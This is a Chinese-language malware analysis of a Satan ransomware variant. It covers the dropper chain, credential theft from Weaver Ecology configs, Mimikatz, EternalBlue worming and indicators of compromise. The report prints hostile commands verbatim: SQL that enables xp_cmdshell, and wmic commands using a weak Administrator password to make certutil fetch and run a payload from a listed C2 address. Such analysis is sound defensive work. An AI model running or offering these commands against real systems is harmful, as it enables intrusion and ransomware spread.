# **样本简介**  

撒旦(Satan)病毒是一款恶意勒索程序，首次出现2017年1月份。Satan病毒的开发者通过网站允许用户生成自己的Satan变种，并且提供CHM和带宏脚本Word文档的下载器生成脚本进行传播。Satan勒索病毒主要用于针对服务器的数据库文件进行加密，非常具有针对性。

近期Satan勒索病毒家族在低调几个月后又重新活跃起来，此次捕获到的样本为该黑产团伙释放的母体新变种，最终造成加密的格式为：[5ss5c@mail.ru]c.zip.JAVRIXREHPPDEX8GL1U94XRS04TVJ59C7LT3E2MY，提供的联系邮箱为：5ss5c@mail.ru，加密文件扩展名为：.5ss5c。

该变种本地运行后，实际加密的进程为cpt.exe。

![image.png](https://image.3001.net/images/20200414/1586830228_5e951b94a6cf6.png!small)  

生成的勒索信已经全部使用中文进行描述，如下。  

![image.png](https://image.3001.net/images/20200414/1586830242_5e951ba281b83.png!small)  

文件最终加密的结果，如下。  

![image.png](https://image.3001.net/images/20200414/1586830253_5e951badafacf.png!small)![image.png](https://image.3001.net/images/20200414/1586830257_5e951bb154bb2.png!small)  

##  **母体分析**

母体恶意样本如下，检测出存在壳。编译时间为2020年1月12日，采用压缩壳，同时也无pdb路径信息，已被抹去。实际运行后，会对系统里的文件进行加密，最后造成的实际影响结果为勒索软件，通过对相关勒索信息的分析观察发现可能为国产勒索。

![image.png](https://image.3001.net/images/20200414/1586830270_5e951bbec8ac4.png!small)

![image.png](https://image.3001.net/images/20200414/1586830274_5e951bc237c72.png!small)  

释放在本地的文件，如下为cpt.exe，查询后同样加壳，编译时间与母体相距时间不长，只差半小时。  

![image.png](https://image.3001.net/images/20200414/1586830285_5e951bcd462e6.png!small)

![image.png](https://image.3001.net/images/20200414/1586830289_5e951bd12a223.png!small)  

释放在本地的poc.exe，查询后发现为已打包的文件。  

![image.png](https://image.3001.net/images/20200414/1586830296_5e951bd8985a9.png!small)  

通过服务端下载并释放在本地的c.exe同样加壳，该文件同样为母体文件，作为后续传播使用。  

![image.png](https://image.3001.net/images/20200414/1586830304_5e951be025c68.png!small)  

##  **详细分析**

接下来就分析下捕获到的母体恶意文件，如下为调试时最初的入口。

![image.png](https://image.3001.net/images/20200414/1586830314_5e951bea3e152.png!small)  

对其脱壳后，发现为Delphi程序，编译时间为2020年1月12日，距离捕获该样本时间仅相隔1天。  

![image.png](https://image.3001.net/images/20200414/1586830323_5e951bf3d1e8c.png!small)

![image.png](https://image.3001.net/images/20200414/1586830327_5e951bf7039f2.png!small)  

分析时发现了一些泛微系统的痕迹（泛微系统的配置文件路径），会涉及到利用泛微相关漏洞。  

![image.png](https://image.3001.net/images/20200414/1586830333_5e951bfd8c5a2.png!small)  

发现xp_cmdshell，通常安全人员在进行渗透测试时对于MSSQL存在注入的时候会使用xp_cmdshell来执行系统命令。但MSSQL环境默认情况下xp_cmdshell
是禁止的，此处恶意软件采用命令：EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC
sp_configure 'xp_cmdshell', 1;RECONFIGURE;开启该功能后可执行系统命令。

经分析发现恶意软件会通过执行certutil.exe来下载后续将使用到的恶意文件，下载的同时并在本地重命名后执行恶意文件，此处certutil.exe成为了下载器downloader，但如果不删除相应的日志，会在本地生成certutil的日志，会记录具体操作内容。

该处恶意软件利用技巧：找到泛微系统配置文件，读取并获取到当前系统数据库账号密码，数据库登陆成功后，执行系统命令，使用certutil.exe作为downloader来下载恶意文件并执行来进行行为伪装。

![image.png](https://image.3001.net/images/20200414/1586830344_5e951c0855a0a.png!small)![image.png](https://image.3001.net/images/20200414/1586830351_5e951c0f9bf9f.png!small)  

静态分析时，在母体恶意软件里发现的一处比较常见的ring3层反调试。  

![image.png](https://image.3001.net/images/20200414/1586830360_5e951c183e70a.png!small)  

最后进入恶意程序主要流程，首先会创建互斥量SSSS_Scan，保证实例单一运行。  

![image.png](https://image.3001.net/images/20200414/1586830368_5e951c20e64da.png!small)  

后续会生成随机16个字节的字符串，例如"4D002ROMOD6DSZRE"。  

![image.png](https://image.3001.net/images/20200414/1586830378_5e951c2ac3893.png!small)

![image.png](https://image.3001.net/images/20200414/1586830381_5e951c2de116d.png!small)  

释放文件使用到的目录为C:\ProgramData\，该目录默认情况下是隐藏的，如果普通用户没有勾选显示隐藏的文件与文件夹可能无法查看到恶意文件，释放的文件为mmkt.exe与poc.exe，经分析都直接附加在母体恶意文件内部，没有任何加密的操作，很容易被静态分析手段给检测出来，如下。  

![image.png](https://image.3001.net/images/20200414/1586830399_5e951c3f8de50.png!small)

![image.png](https://image.3001.net/images/20200414/1586830403_5e951c43cf666.png!small)![image.png](https://image.3001.net/images/20200414/1586830417_5e951c5143510.png!small)![image.png](https://image.3001.net/images/20200414/1586830422_5e951c564bb69.png!small)![image.png](https://image.3001.net/images/20200414/1586830426_5e951c5ac09ec.png!small)  

先来看看mmkt.exe，经分析发现实际这是Mimikatz利用工具，被用于来获取Windows的相关登陆凭证，但静态分析发现该工具只针对x64架构的系统。  

![image.png](https://image.3001.net/images/20200414/1586830435_5e951c63e8d02.png!small)  

脱壳后，发现为VS2017编译的程序。  

![image.png](https://image.3001.net/images/20200414/1586830446_5e951c6e9347d.png!small)  

mmkt.exe的编译时间如下，这里大致判断下活跃时间，编译时间为2019年10月30日，首次提交分析时间在编译时间之后几天，说明黑产从2019年10月30日之后就已经开始利用该工具开展活动了。  

![image.png](https://image.3001.net/images/20200414/1586830453_5e951c75e120d.png!small)  

采用ShellExecuteA命令行方式启动会执行失败，实际经笔者本地再次实验时也还是执行失败，估计是未完成的版本。  

![image.png](https://image.3001.net/images/20200414/1586830463_5e951c7f68953.png!small)  

poc.exe文件为使用Enigma Virtual Box打包的单文件，Enigma Virtual
Box是一款Windows环境下的虚拟文件打包系统，也就是俗称的单文件制作工具，它可以将程序和配套文件打包成单个可执行文件，而没有任何效率的损失，配套文件也不会被释放至硬盘。对poc.exe进行解包后发现释放了永恒之蓝与双星漏洞利用工具，这里可以判断会存在蠕虫传播的功能。  

![image.png](https://image.3001.net/images/20200414/1586830474_5e951c8ae738a.png!small)  

母体的实际执行流程如下，先本地释放附加的文件，之后读取配置文件，登陆数据库，接着执行下载命令，下载后续的恶意文件，开启多个线程进行内网扫描并传播。  

![image.png](https://image.3001.net/images/20200414/1586830482_5e951c929d241.png!small)  

会读取泛微Ecology的配置文件的用户名与密码，便于后续登陆连接数据库。  

![image.png](https://image.3001.net/images/20200414/1586830489_5e951c99ae934.png!small)

![image.png](https://image.3001.net/images/20200414/1586830492_5e951c9c9a33c.png!small)

![image.png](https://image.3001.net/images/20200414/1586830502_5e951ca68df33.png!small)  

线程thread1_sub_4075F0会获取当前系统IP地址，然后对其C段地址进行漏洞扫描利用。  

![image.png](https://image.3001.net/images/20200414/1586830521_5e951cb9c6271.png!small)  

每一个地址都开启一个线程，会创建254个线程进行扫描。  

![image.png](https://image.3001.net/images/20200414/1586830533_5e951cc5d5e1d.png!small)  

线程开启情况如下  

![image.png](https://image.3001.net/images/20200414/1586830543_5e951ccfea98e.png!small)  

扫描的同时会释放漏洞利用工具，如下。  

![image.png](https://image.3001.net/images/20200414/1586830555_5e951cdb27fd9.png!small)  

执行后，已打包文件会在本地直接释放出漏洞利用工具。  

![image.png](https://image.3001.net/images/20200414/1586830565_5e951ce56617b.png!small)  

两个主线程会同时开启扫描子线程，分别对C段与B段地址同时进行扫描，如下。  

![image.png](https://image.3001.net/images/20200414/1586830573_5e951ced31890.png!small)  

详细扫描连接情况，如下。  

![image.png](https://image.3001.net/images/20200414/1586830582_5e951cf68f98f.png!small)

![image.png](https://image.3001.net/images/20200414/1586830586_5e951cfa5cd96.png!small)  

之后会将扫描的结果写入本地文件Scanlog，之后母体恶意软件会上传信息至C2服务器。本地文件路径为C:\\\Program Files\\\Common
Files\\\System\\\Scanlog  

![image.png](https://image.3001.net/images/20200414/1586830604_5e951d0cb6cbd.png!small)

![image.png](https://image.3001.net/images/20200414/1586830612_5e951d145eb1a.png!small)

![image.png](https://image.3001.net/images/20200414/1586830619_5e951d1be83ea.png!small)  

扫描的同时会尝试使用wmic指令远程执行命令，如下，后续使用之前获取并内部组合的弱口令字典以此来登陆远程系统并执行命令。

命令如下：

wmic /node:IP地址 process call create "cmd.exe /c certutil.exe -urlcache -split
-f http://58.221.158.90:88/car/down.txt C:/c.exe&C:\c.exe

C:\Windows\System32\cmd.exe /c wmic /node:IP地址 /user:Administrator
/password:123456 process call create "cmd.exe /c certutil.exe -urlcache -split
-f http://58.221.158.90:88/car/down.txt C:/c.exe&C:\c.exe"

![image.png](https://image.3001.net/images/20200414/1586830630_5e951d26b5099.png!small)  

线程thread2_sub_406D30会对B网段进行扫描，同样使用永恒之蓝与双星漏洞进行漏洞利用传播。以上线程执行完毕后，后续会检查母体PE文件。  

![image.png](https://image.3001.net/images/20200414/1586830639_5e951d2fc4845.png!small)  

至此，母体恶意文件的整体分析就结束了。  

##  **down.txt分析**

接下来就分析下漏洞传播过程中会在受害机器上下载的down.txt文件，查询后发现同样加壳，依然是MPRESS2.19，对其脱壳后，发现了关键的路径与地址。

![image.png](https://image.3001.net/images/20200414/1586830654_5e951d3e5428b.png!small)![image.png](https://image.3001.net/images/20200414/1586830657_5e951d41d2c63.png!small)  

经分析后发现依然是属于下载器downloader模式，不过这次下载执行的恶意文件属于勒索软件。  

![image.png](https://image.3001.net/images/20200414/1586830665_5e951d49e292c.png!small)  

cpt.dat多次访问无法下载后，会尝试下载c.dat并改名执行，c.dat具有大部分母体恶意文件的功能，同样是后续会下载downloader，释放漏洞利用工具扫描内网进行传播。  

![image.png](https://image.3001.net/images/20200414/1586830674_5e951d523ddbd.png!small)

![image.png](https://image.3001.net/images/20200414/1586830680_5e951d580491a.png!small)![image.png](https://image.3001.net/images/20200414/1586830687_5e951d5fb80fc.png!small)  

整体调用流程如下  

![image.png](https://image.3001.net/images/20200414/1586830695_5e951d6753e58.png!small)  

##  **整体流程图**

![image.png](https://image.3001.net/images/20200414/1586830709_5e951d759d0c8.png!small)  

##  **大致影响**

在该样本捕获后，后续又过了一段时间后发现在公网上有被地方公安通报的勒索公告，原文已被删除，由此说明此次黑产活动影响的范围很广。相关应急人员应急时遭遇的涉及本次恶意文件的黑产活动，例如《疫情期间处理勒索病毒的收获》。以及各种被加密的案例，如下：

![image.png](https://image.3001.net/images/20200414/1586830721_5e951d814232e.png!small)

![image.png](https://image.3001.net/images/20200414/1586830725_5e951d858e9cb.png!small)  

##  **威胁情报**

HASH

01a9b1f9a9db526a54a64e39a605dd30

853358339279b590fb1c40c3dc0cdb72

C&C

58.221.158.90

61.186.243.2

##  **解决方案**

深信服下一代防火墙AF、终端检测响应平台EDR、安全态势感知平台SIP等安全产品均能有效检测防御此恶意软件，已经部署相关产品的用户可以进行安全扫描，检测清除此恶意软件，如图所示：

![image.png](https://image.3001.net/images/20200414/1586830749_5e951d9d51cf0.png!small)

